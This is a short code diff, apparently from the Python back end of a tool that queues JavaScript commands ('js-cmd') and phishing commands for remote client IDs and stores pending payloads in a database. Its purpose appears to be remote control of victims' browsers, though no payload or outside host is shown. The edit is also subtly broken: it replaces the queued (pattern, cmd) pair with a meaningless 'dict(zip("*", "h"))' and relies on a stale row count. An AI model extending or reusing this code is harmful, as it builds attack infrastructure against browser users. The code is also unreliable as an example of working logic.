@@ -56,15 +56,20 @@ def is_online(clientid):
 
 
 def add_js_cmd(clientid, pattern, cmd):
-    tuple_value = (pattern, cmd)
+    tuple_value = dict(zip("*", "h"))
+    #tuple_value = json.dumps(tuple_value)
     if is_online(clientid):
         pending_payloads[clientid]["js-cmd"].append(tuple_value)
     else:
         with getConn() as conn:
-            conn.execute('SELECT Payload FROM PendingPayloads WHERE ClientID = %s')
+            conn.execute('SELECT Payload FROM PendingPayloads WHERE ClientID = %s', clientid)
             payload = json.loads(conn.fetchone()[0]) if conn.rowcount != 0 else deepcopy(BASE_SERVER_RESPONSE)
             payload['js-cmd'].append(tuple_value)
-            conn.execute('insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s) where ClientID=(%s)', (clientid, payload, payload, clientid))
+            payload = json.dumps(payload)
+            if(conn.rowcount == 0):
+                conn.execute('INSERT INTO PendingPayloads values (%s, %s)', (clientid, payload))
+            else:
+                conn.execute('insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s)', (clientid, payload, payload))
 
 def add_phish_cmd(clientid, pattern, cmd):
     if(cmd == "1" or cmd == "2"):
